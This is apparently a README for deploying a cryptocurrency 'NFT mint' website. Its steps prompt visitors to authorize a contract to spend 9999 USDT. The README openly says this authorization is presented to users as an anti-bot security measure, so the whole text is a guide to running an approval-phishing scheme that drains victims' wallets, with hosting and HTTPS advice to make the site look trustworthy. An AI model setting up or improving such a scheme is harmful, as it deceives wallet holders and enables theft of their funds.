    This project allows users to mint an NFT by authorizing the contract to spend USDT. 
    The authorization process is presented as a security measure to avoid bot attacks.

    ## How to deploy:

    1. Upload `index.html`, `mint.js`, and other project files to your hosting provider.
    2. Ensure that users connect their wallet via MetaMask, imToken, or Trust Wallet.
    3. When the user clicks 'Mint NFT', they will be prompted to authorize the contract to spend 9999 USDT.
    4. Once authorized, the minting process will proceed.

    ## Additional Instructions:
    - Ensure that your project is hosted on a secure website with HTTPS.
